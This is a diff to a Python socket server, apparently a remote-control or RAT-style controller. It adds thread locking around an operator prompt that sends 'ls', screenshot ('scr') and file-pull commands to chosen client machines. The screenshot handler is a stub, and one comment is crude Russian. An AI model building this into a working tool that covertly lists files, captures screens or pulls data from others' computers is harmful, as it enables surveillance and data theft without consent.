@@ -8,7 +8,7 @@ import threading
 #Threads=[]
 
 Threads_dict={}
-
+block_thread = threading.Condition()
 def main():
     start_server()
 
@@ -32,12 +32,14 @@ def start_server():
     Thread(target=listening_thread, args=(soc, max_query)).start()
     is_active=True
     while is_active:
-        command = input('enter a command: ')
-        print(Threads_dict)
-        ip = input('which client?')
-        Threads_dict[ip] = command
+        with block_thread:
+            command = input('enter a command: ')
+            print(Threads_dict)
+            ip = input('which client?')
+            if ip in Threads_dict:
+                Threads_dict[ip] = command
+                block_thread.wait()
         
-
     soc.close()
 
 
@@ -62,38 +64,54 @@ def listening_thread(soc, max_query):
 
 def client_thread(connection, ip, port, max_buffer_size = 5120):
     is_active = True
-
+   
     while is_active:
         if(Threads_dict.get(ip) != ''):
             #client_input = receive_input(connection, max_buffer_size)
             client_input = Threads_dict.get(ip)
-            print(client_input)
+            print('command:' + client_input + ' for ' + ip)
             if "--quit--" in client_input:
                 print("Client is requesting to quit")
                 connection.close()
                 print("Connection " + ip + ":" + port + " closed")
                 is_active = False
             elif("push" in client_input):
-                load_file(connection)
-                is_active = False
-            elif("ls" in client_input):
-                #здесь надо стопать главный тред а то уебищный вывод
                 connection.sendall('ls'.encode('utf-8'))
                 Threads_dict.update({ip:''})
                 print(connection.recv(1024).decode('utf-8'))
+            elif("scr" in client_input):
+                with block_thread:
+                    connection.sendall('scr'.encode('utf-8'))
+                    '''
+                        here will be screenshot saver 
+                    '''
+                    block_thread.notify_all()
+            elif("ls" in client_input):
+                #здесь надо стопать главный тред а то уебищный вывод
+                with block_thread:
+                    connection.sendall('ls'.encode('utf-8'))
+                    Threads_dict.update({ip:''})
+                    print(connection.recv(1024).decode('utf-8'))
+                    block_thread.notify_all()
+        
             elif("pull" in client_input):
-                name = connection.recv(1024)
-                send_file(name, connection)
-                is_active = False
+                with block_thread:
+                    connection.sendall('pull'.encode('utf-8'))
+                    file_name = input('enter filename: ')
+                    connection.sendall(file_name.encode('utf-8'))
+                    load_file(file_name ,connection)
+                    Threads_dict.update({ip:''})
+                    block_thread.notify_all()
+                    #is_active = False
             
 
 
         
 
-def load_file(c):
+def load_file(fn,c):
     print("Receiving...")
-    l = c.recv(1024)
-    f = open(l,'wb')
+    #l = c.recv(1024)
+    f = open(fn,'wb')
     l = c.recv(1024)
     while (l):
         print("Receiving...")
